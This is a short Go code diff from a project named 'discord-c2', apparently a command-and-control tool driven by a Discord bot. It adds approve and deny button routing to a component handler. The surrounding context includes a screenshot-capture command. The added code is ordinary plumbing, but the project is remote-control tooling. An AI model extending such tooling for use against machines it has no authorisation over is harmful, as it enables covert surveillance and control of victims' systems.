@@ -4,6 +4,7 @@ package commands
 
 import (
 	"runtime"
+	"strings"
 
 	"discord-c2/internal/media"
 
@@ -157,6 +158,14 @@ func handleDevGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data d
 }
 
 func handleComponent(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.MessageComponentInteractionData) {
+	if strings.HasPrefix(data.CustomID, approvePrefix) {
+		handleApproval(s, i, data, true)
+		return
+	}
+	if strings.HasPrefix(data.CustomID, denyPrefix) {
+		handleApproval(s, i, data, false)
+		return
+	}
 	switch data.CustomID {
 	case "d2c_screenshot":
 		respondEphemeral(s, i, "📸 Capturing screenshots...")
